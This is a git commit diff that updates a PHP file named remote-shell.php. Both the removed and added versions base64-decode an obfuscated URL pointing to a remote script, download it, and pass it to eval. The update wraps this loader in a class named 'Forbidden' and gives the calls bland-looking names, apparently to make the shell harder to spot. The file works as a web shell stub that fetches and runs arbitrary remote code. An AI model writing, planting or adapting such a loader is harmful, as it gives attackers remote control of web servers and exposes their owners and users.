8b9a6910467303a2a1307ef9f7428b2c1b9ba6fb
xdavian <107116728+xdavian@users.noreply.github.com>
2023-03-17 05:37:51 +0700

    Update remote-shell.php

--- remote-shell.php
+++ remote-shell.php
@@ -1,6 +1,13 @@
 <?php
-function xeval($a) { return eval($a); }
-function xbase($a) { return base64_decode($a); }
-xeval(file_get_contents(xbase("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hkYXZpYW4vc2hlbGwvbWFpbi9pbmRveHBsb2l0LXYy")));
+class Forbidden {
+	public function Feval($string) {
+		return eval($string);
+	}
+	public function Fbase($string) {
+		return base64_decode($string);
+	}
+}
+$error = New Forbidden;
+$error->Feval(file_get_contents($error->Fbase("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hkYXZpYW4vc2hlbGwvbWFpbi9pbmRveHBsb2l0LXYy")));
 
 ?>
